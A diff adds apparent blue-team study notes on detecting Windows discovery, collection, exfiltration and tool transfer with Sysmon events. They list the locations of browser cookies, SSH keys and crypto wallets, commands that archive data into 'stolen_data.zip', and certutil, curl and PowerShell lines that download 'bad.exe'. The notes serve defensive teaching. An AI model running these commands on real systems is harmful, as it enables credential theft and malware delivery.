@@ -13861,3 +13861,237 @@ Sysmon 22 → DNS
 Logon ID  → Correlate user activity
 ProcessId → Correlate Sysmon activity
 ```
+
+# Windows Threat Detection 2
+
+## Discovery
+
+**Discovery** is when attackers collect information about a compromised Windows system before continuing the attack.
+
+They may look for:
+
+- Users and privileges
+- Files and folders
+- Running processes and services
+- Network configuration
+- Security tools such as Windows Defender
+- Installed applications
+
+## Common Discovery Commands
+
+| Purpose | Commands |
+|---|---|
+| Current user | `whoami` |
+| Users | `net user` / `Get-LocalUser` |
+| Groups | `net localgroup` |
+| Logged-in users | `query user` |
+| Files | `dir` / `Get-ChildItem` |
+| Read file | `type <file>` / `Get-Content <file>` |
+| Processes | `tasklist /v` |
+| System information | `systeminfo` |
+| Services | `Get-Service` |
+| Network config | `ipconfig /all` |
+| Network connections | `netstat -ano` |
+| Firewall | `netsh advfirewall show allprofiles` |
+| Installed apps | `wmic product get name,version` |
+| Defender | `Get-MpPreference` |
+
+## Detecting Discovery
+
+Look for:
+
+- Multiple discovery commands executed close together
+- Suspicious processes launching `cmd.exe` or `powershell.exe`
+- Discovery commands launched by unusual applications
+- Unexpected users performing administrative discovery
+
+### Sysmon
+
+Use **Sysmon Event ID 1 (Process Creation)**.
+
+Correlate:
+
+```text
+ProcessId
+ParentProcessId
+```
+
+This allows you to build the **process tree** and identify where the commands came from.
+
+---
+
+# Collection
+
+**Collection** is when attackers search for and gather valuable data from the compromised system.
+
+Common targets include:
+
+```text
+Documents
+Passwords
+Browser data
+Cookies
+Chat history
+SSH credentials
+Crypto wallets
+Database files
+```
+
+## Common Collection Locations
+
+```text
+C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Default\History
+C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Default\Cookies
+C:\Users\<user>\.ssh\*
+C:\Users\<user>\AppData\Roaming\Bitcoin\wallet.dat
+```
+
+## Common Collection Commands
+
+Search files:
+
+```powershell
+Get-ChildItem C:\Users\<user> -Recurse -Filter *.pdf
+```
+
+Read files:
+
+```cmd
+type secrets.txt
+```
+
+Search for keywords:
+
+```cmd
+type debug-logs.txt | findstr password
+```
+
+Copy data:
+
+```powershell
+copy C:\Users\<user>\AppData\Roaming\Signal C:\Temp\
+```
+
+Archive data:
+
+```powershell
+Compress-Archive C:\Temp\ C:\Temp\stolen_data.zip
+```
+
+Or:
+
+```cmd
+7za.exe a -tzip C:\Temp\stolen_data.zip C:\Temp\*.*
+```
+
+## Detecting Collection
+
+Look for:
+
+- Access to sensitive files
+- Large numbers of files being searched or copied
+- Files copied to `C:\Temp` or `C:\Users\Public`
+- Archive creation such as `.zip`
+- Suspicious processes reading sensitive directories
+
+Use **Sysmon Event ID 1** to identify the process performing the activity.
+
+---
+
+# Exfiltration
+
+**Exfiltration** is sending stolen data from the victim system to an attacker-controlled location.
+
+Attackers may use:
+
+- Cloud storage
+- GitHub
+- Telegram
+- Attacker-controlled servers
+
+### Detection
+
+Look for:
+
+```text
+Large outbound transfers
+Suspicious external IPs/domains
+Unexpected processes making network connections
+Archive files followed by outbound connections
+```
+
+---
+
+# Ingress Tool Transfer
+
+**Ingress Tool Transfer** means downloading additional tools or malware onto a compromised system.
+
+MITRE ATT&CK:
+
+```text
+T1105 - Ingress Tool Transfer
+```
+
+## Common Methods
+
+### Certutil
+
+```cmd
+certutil.exe -urlcache -f https://example.com/bad.exe good.exe
+```
+
+### Curl
+
+```cmd
+curl.exe https://example.com/bad.exe -o good.exe
+```
+
+### PowerShell
+
+```powershell
+Invoke-WebRequest -Uri "https://example.com/bad.exe" -OutFile "good.exe"
+```
+
+### Browser / RDP
+
+Attackers can also download or copy files through:
+
+```text
+Web Browser
+RDP
+```
+
+## Detecting Tool Transfer
+
+Check:
+
+1. **Which process** downloaded the file
+2. **Destination domain/IP**
+3. **Downloaded filename/path**
+4. **DNS and network activity**
+5. Whether the destination is trusted or suspicious
+
+Useful Sysmon events:
+
+```text
+Event ID 1  → Process Creation
+Event ID 3  → Network Connection
+Event ID 22 → DNS Query
+Event ID 11 → File Creation
+```
+
+# Quick Cheat Sheet
+
+```text
+Discovery        → Learn about the system
+Collection       → Find and gather valuable data
+Exfiltration     → Send stolen data out
+Ingress Transfer → Download tools/malware
+
+Sysmon 1  → Process
+Sysmon 3  → Network
+Sysmon 11 → File creation
+Sysmon 22 → DNS
+
+ProcessId + ParentProcessId → Build process tree
+```
